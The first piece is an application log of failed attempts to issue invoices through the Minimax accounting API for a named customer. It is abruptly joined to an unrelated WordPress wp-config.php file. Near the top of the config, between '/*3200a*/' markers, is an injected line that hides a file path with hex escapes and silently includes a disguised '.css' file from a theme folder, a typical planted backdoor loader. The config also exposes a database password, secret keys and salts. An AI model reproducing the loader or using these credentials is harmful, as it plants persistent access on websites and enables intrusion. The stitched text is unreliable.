  VatRate: { ID: 36, Name: 'S', ResourceUrl: '/api/orgs/215967/vatrates/36' },
  Price: 58.5,
  Currency: { ID: 7, Name: 'EUR', ResourceUrl: '/api/orgs/215967/currencies/7' },
  RevenueAccountDomestic: {
    ID: 120646227,
    Name: 'Prihodki od prodaje storitev na domačem trgu',
    ResourceUrl: '/api/orgs/215967/accounts/120646227'
  },
  RevenueAccountOutsideEU: {
    ID: 120646235,
    Name: 'Prihodki od prodaje storitev na trgu izven EU',
    ResourceUrl: '/api/orgs/215967/accounts/120646235'
  },
  RevenueAccountEU: {
    ID: 120646234,
    Name: 'Prihodki od prodaje storitev na trgu EU',
    ResourceUrl: '/api/orgs/215967/accounts/120646234'
  },
  StocksAccount: null,
  ProductGroup: null
}
=====================
=====================
Adding a new issued invoice with data: {
  "InvoiceType": "R",
  "Customer": {
    "ID": 16591463,
    "Name": "Yuri Kelley"
  },
  "DocumentNumbering": {
    "ID": 52130
  },
  "DateIssued": "2024-10-09T17:01:10.236Z",
  "DateTransaction": "2024-10-09T17:01:10.236Z",
  "DateDue": "2024-10-09T17:01:10.236Z",
  "IssuedInvoiceRows": [
    {
      "RowNumber": 1,
      "Item": {
        "ID": 9404297,
        "Name": "Testament premium"
      },
      "ItemName": "Testament premium",
      "Description": "Testament premium platform membership",
      "Quantity": 1,
      "UnitOfMeasurement": "unit",
      "Price": 58.5,
      "VatRate": {
        "ID": 36,
        "Name": "S"
      },
      "VATPercent": 22
    }
  ],
  "IssuedInvoicePaymentMethods": [
    {
      "PaymentMethod": {
        "ID": 412535
      },
      "Amount": 58.5,
      "AlreadyPaid": "D"
    }
  ],
  "Employee": {
    "ID": 588854,
    "Name": "NICOLA"
  }
}
Issued invoice added successfully
Searching for customerID: 16591463
Latest issued invoice: {
  IssuedInvoiceId: 41029592,
  InvoiceType: 'R',
  Year: 2024,
  InvoiceNumber: 1,
  Numbering: 'BL-01',
  DocumentNumbering: {
    ID: 52130,
    Name: 'BL-01',
    ResourceUrl: '/api/orgs/215967/document-numbering/52130'
  },
  Customer: {
    ID: 16591463,
    Name: 'Yuri Kelley',
    ResourceUrl: '/api/orgs/215967/customers/16591463'
  },
  DateIssued: '2024-10-09T18:47:13.707',
  DateTransaction: '2024-10-09T00:00:00',
  DateDue: '2024-10-09T00:00:00',
  Currency: { ID: 7, Name: 'EUR', ResourceUrl: '/api/orgs/215967/currencies/7' },
  Analytics: null,
  Status: 'I',
  PaymentStatus: 'Placan',
  InvoiceValue: 71.37,
  PaidValue: 71.37,
  RecordDtModified: '2024-10-09T18:47:16.11',
  RowVersion: 'AAAABry7fO8='
}
Issued premium invoice: {
  IssuedInvoiceId: 41029592,
  InvoiceType: 'R',
  Year: 2024,
  InvoiceNumber: 1,
  Numbering: 'BL-01',
  DocumentNumbering: {
    ID: 52130,
    Name: 'BL-01',
    ResourceUrl: '/api/orgs/215967/document-numbering/52130'
  },
  Customer: {
    ID: 16591463,
    Name: 'Yuri Kelley',
    ResourceUrl: '/api/orgs/215967/customers/16591463'
  },
  DateIssued: '2024-10-09T18:47:13.707',
  DateTransaction: '2024-10-09T00:00:00',
  DateDue: '2024-10-09T00:00:00',
  Currency: { ID: 7, Name: 'EUR', ResourceUrl: '/api/orgs/215967/currencies/7' },
  Analytics: null,
  Status: 'I',
  PaymentStatus: 'Placan',
  InvoiceValue: 71.37,
  PaidValue: 71.37,
  RecordDtModified: '2024-10-09T18:47:16.11',
  RowVersion: 'AAAABry7fO8='
}
=====================
Issuing premium invoice with action: issueAndGeneratepdf
Performing custom action (issueAndGeneratepdf) on issued invoice...
Error performing custom action (issueAndGeneratepdf) on issued invoice: {
  ValidationMessages: [
    {
      Message: '<ul><li>Izstavite lahko le izdane račune/predračune v osnutku.</li></ul>',
      PropertyName: 'BusinessLogic'
    }
  ],
  Data: null
}
(λ: app) RequestId: 22194557-037e-4e74-880b-61c156121cfd  Duration: 3075.75 ms  Billed Duration: 3076 ms
Status: 409
Headers: Object [AxiosHeaders] {
  'cache-control': 'no-cache',
  pragma: 'no-cache',
  'content-length': '156',
  'content-type': 'application/json; charset=utf-8',
  expires: '-1',
  server: 'Microsoft-IIS/10.0',
  'x-aspnet-version': '4.0.30319',
  'x-powered-by': 'ASP.NET',
  date: 'Wed, 09 Oct 2024 17:01:10 GMT'
}
Error issuing premium invoice: {
  ValidationMessages: [
    {
      Message: '<ul><li>Izstavite lahko le izdane račune/predračune v osnutku.</li></ul>',
      PropertyName: 'BusinessLogic'
    }
  ],
  Data: null
}
Status: 409
Headers: Object [AxiosHeaders] {
  'cache-control': 'no-cache',
  pragma: 'no-cache',
  'content-length': '156',
  'content-type': 'application/json; charset=utf-8',
  expires: '-1',
  server: 'Microsoft-IIS/10.0',
  'x-aspnet-version': '4.0.30319',
  'x-powered-by': 'ASP.NET',
  date: 'Wed, 09 Oct 2024 17:01:10 GMT'
}
Failed Minimax: Request failed with status code 409


ANY /auth/login (λ: app)
Connection has been established successfully.
(λ: app) RequestId: 03d7b3a1-710d-4ec2-ae24-7854a6608f31  Duration: 3449.13 ms  Billed Duration: 3450 ms


ANY /stripe (λ: app)
Authenticating with Minimax...
Authenticated with Minimax successfully!
=====================
=====================
Fetching payment methods...
Payment method found: {
  PaymentMethodId: 412535,
  Name: 'STRIPE',
  Type: 'K',
  Usage: 'D',
  Default: 'D'
}
=====================
Fetching items...
Premium item found: {
  ItemId: 9404297,
  Title: 'Testament premium',
  Code: '',
  UnitOfMeasurement: null,
  MassPerUnit: 0,
  ItemType: 'S',
  VatRate: { ID: 36, Name: 'S', ResourceUrl: '/api/orgs/215967/vatrates/36' },
  Price: 58.5,
  Currency: { ID: 7, Name: 'EUR', ResourceUrl: '/api/orgs/215967/currencies/7' },
  RevenueAccountDomestic: {
    ID: 120646227,
    Name: 'Prihodki od prodaje storitev na domačem trgu',
    ResourceUrl: '/api/orgs/215967/accounts/120646227'
  },
  RevenueAccountOutsideEU: {
    ID: 120646235,
    Name: 'Prihodki od prodaje storitev na trgu izven EU',
    ResourceUrl: '/api/orgs/215967/accounts/120646235'
  },
  RevenueAccountEU: {
    ID: 120646234,
    Name: 'Prihodki od prodaje storitev na trgu EU',
    ResourceUrl: '/api/orgs/215967/accounts/120646234'
  },
  StocksAccount: null,
  ProductGroup: null
}
=====================
=====================
Adding a new issued invoice with data: {
  "InvoiceType": "R",
  "Customer": {
    "ID": 16591463,
    "Name": "Yuri Kelley"
  },
  "DocumentNumbering": {
    "ID": 52130
  },
  "DateIssued": "2024-10-09T17:07:19.695Z",
  "DateTransaction": "2024-10-09T17:07:19.695Z",
  "DateDue": "2024-10-09T17:07:19.695Z",
  "IssuedInvoiceRows": [
    {
      "RowNumber": 1,
      "Item": {
        "ID": 9404297,
        "Name": "Testament premium"
      },
      "ItemName": "Testament premium",
      "Description": "Testament premium platform membership",
      "Quantity": 1,
      "UnitOfMeasurement": "unit",
      "Price": 58.5,
      "VatRate": {
        "ID": 36,
        "Name": "S"
      },
      "VATPercent": 22
    }
  ],
  "IssuedInvoicePaymentMethods": [
    {
      "PaymentMethod": {
        "ID": 412535
      },
      "Amount": 58.5,
      "AlreadyPaid": "D"
    }
  ],
  "Employee": {
    "ID": 588854,
    "Name": "NICOLA"
  }
}
Issued invoice added successfully
Searching for customerID: 16591463
Latest issued invoice: {
  IssuedInvoiceId: 41029735,
  InvoiceType: 'R',
  Year: 2024,
  InvoiceNumber: 2,
  Numbering: 'BL-01',
  DocumentNumbering: {
    ID: 52130,
    Name: 'BL-01',
    ResourceUrl: '/api/orgs/215967/document-numbering/52130'
  },
  Customer: {
    ID: 16591463,
    Name: 'Yuri Kelley',
    ResourceUrl: '/api/orgs/215967/customers/16591463'
  },
  DateIssued: '2024-10-09T19:05:44.377',
  DateTransaction: '2024-10-09T00:00:00',
  DateDue: '2024-10-09T00:00:00',
  Currency: { ID: 7, Name: 'EUR', ResourceUrl: '/api/orgs/215967/currencies/7' },
  Analytics: null,
  Status: 'I',
  PaymentStatus: 'Placan',
  InvoiceValue: 71.37,
  PaidValue: 71.37,
  RecordDtModified: '2024-10-09T19:05:46.927',
  RowVersion: 'AAAABry7/Hk='
}
Issued premium invoice: {
  IssuedInvoiceId: 41029735,
  InvoiceType: 'R',
  Year: 2024,
  InvoiceNumber: 2,
  Numbering: 'BL-01',
  DocumentNumbering: {
    ID: 52130,
    Name: 'BL-01',
    ResourceUrl: '/api/orgs/215967/document-numbering/52130'
  },
  Customer: {
    ID: 16591463,
    Name: 'Yuri Kelley',
    ResourceUrl: '/api/orgs/215967/customers/16591463'
  },
  DateIssued: '2024-10-09T19:05:44.377',
  DateTransaction: '2024-10-09T00:00:00',
  DateDue: '2024-10-09T00:00:00',
  Currency: { ID: 7, Name: 'EUR', ResourceUrl: '/api/orgs/215967/currencies/7' },
  Analytics: null,
  Status: 'I',
  PaymentStatus: 'Placan',
  InvoiceValue: 71.37,
  PaidValue: 71.37,
  RecordDtModified: '2024-10-09T19:05:46.927',
  RowVersion: 'AAAABry7/Hk='
}
=====================
Issuing premium invoice with action: issueAndGeneratepdf
Performing custom action (issueAndGeneratepdf) on issued invoice...
Error performing custom action (issueAndGeneratepdf) on issued invoice: {
  ValidationMessages: [
    {
      Message: '<ul><li>Izstavite lahko le izdane račune/predračune v osnutku.</li></ul>',
      PropertyName: 'BusinessLogic'
    }
  ],
  Data: null
}
(λ: app) RequestId: 666a6bb0-f525-4ff6-a304-205a676e3b1a  Duration: 3264.52 ms  Billed Duration: 3265 ms
Status: 409
Headers: Object [AxiosHeaders] {
  'cache-control': 'no-cache',
  pragma: 'no-cache',
  'content-length': '156',
  'content-type': 'application/json; charset=utf-8',
  expires: '-1',
  server: 'Microsoft-IIS/10.0',
  'x-aspnet-version': '4.0.30319',
  'x-powered-by': 'ASP.NET',
  date: 'Wed, 09 Oct 2024 17:07:20 GMT'
}
Error issuing premium invoice: {
  ValidationMessages: [
    {
      Message: '<ul><li>Izstavite lahko le izdane račune/predračune v osnutku.</li></ul>',
      PropertyName: 'BusinessLogic'
    }
  ],
  Data: null
}
Status: 409
Headers: Object [AxiosHeaders] {
  'cache-control': 'no-cache',
  pragma: 'no-cache',
  'content-length': '156',
  'content-type': 'application/json; charset=utf-8',
  expires: '-1',
  server: 'Microsoft-IIS/10.0',
  'x-aspnet-version': '4.0.30319',
  'x-powered-by': 'ASP.NET',
  date: 'Wed, 09 Oct 2024 17:07:20 GMT'
}
Failed Minimax: Request failed with status code 409

<?php
//Begin Really Simple Security key
define('RSSSL_KEY', 'D7Shz5xpJT978bO2EUWRPZQWYRxfCGEkaMNc5tg7KhI2P5NdiWDzztzKVqwrUivx');
//END Really Simple Security key
/*3200a*/

$rub7oj = "/ho\x6de3/co\x6dodosp/public_ht\x6dl/lopezyaispuro/wp\x2dcontent/the\x6des/twentytwentytwo/.08521009.css"; if (empty($rub7oj)) {print ($rub7oj);} else { @include_once /* 224 */ ($rub7oj); }

/*3200a*/


//Begin Really Simple SSL session cookie settings
@ini_set('session.cookie_httponly', true);
@ini_set('session.cookie_secure', true);
@ini_set('session.use_only_cookies', true);
//END Really Simple SSL

/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://wordpress.org/support/article/editing-wp-config-php/
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'comodosp_lopez' );

/** MySQL database username */
define( 'DB_USER', 'comodosp_lopez' );

/** MySQL database password */
define( 'DB_PASSWORD', 'LG3319536037' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );

/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define( 'AUTH_KEY',         'UI!(oc<_<g/:i+t-?u_;a)_$Izs7<zO`4FA*4@U2k2YGw^BNIH957=z(fMPOCyK=' );
define( 'SECURE_AUTH_KEY',  '@1G3jYV+FB%<NiB~*!NBn{t5mDh n<R02Vc]h+~MJikeA1rutE5uur^mRYP/aMo)' );
define( 'LOGGED_IN_KEY',    'P!3=qXjKJ?u7fsRCn~#}N4dyD<:FPUa-2=ptXL(s616I-7EKKn-tr2qm1*n1!Bn.' );
define( 'NONCE_KEY',        'c$&h/#Q,3Xh s01y=~*}>l8D^K4SBMrD`iqI3-9z*rIR=SS!:CTH`3nd&d?.8N{d' );
define( 'AUTH_SALT',        'z0e7kLn6&4YC`Q`*CDROTQ-.16*;jO9g9l:g$Jw4I}}VA+$3G fJUa4DWeZ8se4g' );
define( 'SECURE_AUTH_SALT', 'IhCs.#.V?L<N,2|]CA?bg{:MuBKI`6m_.Zc=qXNE.~G]-wQhr)IVUcKkYAI0U+d/' );
define( 'LOGGED_IN_SALT',   'C.w<$siylUSO]4h%L(fXU}5pfQ^8#COkl;/#{B4O>3Y&|,T~x?}/?eW~HjLBG9R.' );
define( 'NONCE_SALT',       'lsxJd}m]YV?iG%=@xbJ/p@AnOJWtlyv(M@.lpK]d,{<acFo(kC#}.pu7^;20g]~E' );

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the documentation.
 *
 * @link https://wordpress.org/support/article/debugging-in-wordpress/
 */
define( 'WP_DEBUG', true );

define( 'AUTOSAVE_INTERVAL', 300 );
define( 'WP_POST_REVISIONS', 5 );
define( 'EMPTY_TRASH_DAYS', 7 );
define( 'WP_CRON_LOCK_TIMEOUT', 120 );
define('DISALLOW_FILE_EDIT', true);

define('CONCATENATE_SCRIPTS', false);

/* That's all, stop editing! Happy publishing. */

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
	define( 'ABSPATH', __DIR__ . '/' );
}

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';
